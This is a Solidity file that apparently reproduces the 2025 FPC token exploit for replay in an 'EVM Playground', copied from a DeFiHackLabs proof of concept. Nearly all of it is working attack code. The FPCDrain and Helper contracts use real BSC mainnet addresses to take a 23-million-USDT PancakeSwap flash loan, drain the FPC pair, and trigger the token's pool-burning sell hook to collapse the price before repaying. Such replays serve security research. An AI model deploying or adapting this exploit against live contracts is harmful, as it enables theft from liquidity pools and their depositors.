// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-07-FPC).
// The DeFiHackLabs PoC runs the entire attack INLINE in the Foundry test
// contract `FPC` (the PancakeV3 flash-loan callback `pancakeV3FlashCallback`
// and the V2 flash-swap callback `pancakeCall` both live on the test itself),
// so there is no standalone contract to deploy. This is a faithful,
// self-contained copy of that inline attack (testExploit + pancakeV3FlashCallback
// + pancakeCall + the Helper contract) so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/FPC_exp.sol.
//
// Root cause: FPC's ERC-20 _update hook, on every sell-classified transfer
// into its PancakeSwap V2 pair, calls burnLpToken(value * 65 / 100), which
// removes FPC straight OUT OF THE PAIR's own balance (to treasury/reward)
// and then sync()s the pair -- an un-compensated one-sided reserve deletion
// that collapses the constant-product price in the seller's favor.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IPancakeRouter {
    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

address constant USDT_ADDR = 0x55d398326f99059fF775485246999027B3197955;
address constant PANCAKE_POOL = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant PANCAKE_PAIR = 0xa1e08E10Eb09857A8C6F2Ef6CCA297c1a081eD6B;
address constant FPC_ADDR = 0xB192D4A737430AA61CEA4Ce9bFb6432f7D42592F;

contract FPCDrain {
    // step 0: borrow 23,020,000 USDT from the PancakeV3 pool.
    function run() external {
        IPancakeV3Pool(PANCAKE_POOL).flash(address(this), 23_020_000 ether, 0, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 /* fee1 */, bytes calldata /* data */) external {
        uint256 amountIn = 23_019_990 ether;
        address[] memory path = new address[](2);
        path[0] = USDT_ADDR;
        path[1] = FPC_ADDR;
        IPancakeRouter router = IPancakeRouter(payable(PANCAKE_ROUTER));
        uint256[] memory amounts = router.getAmountsOut(amountIn, path);

        // step 1: pay 1 wei USDT into the pair, pull out almost the whole FPC
        // reserve via a raw swap() (this contract must fulfil the K invariant
        // itself in pancakeCall below).
        IPancakePair(PANCAKE_PAIR).swap(1 ether, amounts[1], address(this), hex"00");

        IERC20 fpc = IERC20(FPC_ADDR);
        // step 3: seed a fresh Helper contract with 247,441 FPC and let it
        // sell that FPC back through the router. The Helper->pair transfer
        // is what FPC's _update hook classifies as a "sell", triggering
        // burnLpToken() -- the vulnerability.
        Helper helper = new Helper();
        fpc.transfer(address(helper), 247_441_170_766_403_071_054_109);
        helper.swap(PANCAKE_ROUTER, FPC_ADDR);

        // step 4: repay the flash loan + fee.
        IERC20(USDT_ADDR).transfer(PANCAKE_POOL, 23_020_000 ether + fee0);
    }

    // step 2: the V2 pair calls back into the initiator (this contract) mid-swap;
    // pay the USDT leg here.
    function pancakeCall(address /* sender */, uint256 /* amount0 */, uint256 /* amount1 */, bytes calldata /* data */) external {
        IERC20 usdt = IERC20(USDT_ADDR);
        usdt.transfer(PANCAKE_PAIR, usdt.balanceOf(address(this)));
    }
}

contract Helper {
    function swap(address routerAddr, address fpcAddr) external {
        IERC20 fpc = IERC20(fpcAddr);
        fpc.approve(routerAddr, type(uint256).max);

        uint256 balance = fpc.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = FPC_ADDR;
        path[1] = USDT_ADDR;
        // Root cause: FPC burns tokens out of the POOL's own balance on
        // sell-classified transfers. This sell is what detonates the price.
        IPancakeRouter(payable(routerAddr)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            balance, 0, path, msg.sender, block.timestamp
        );
    }
}
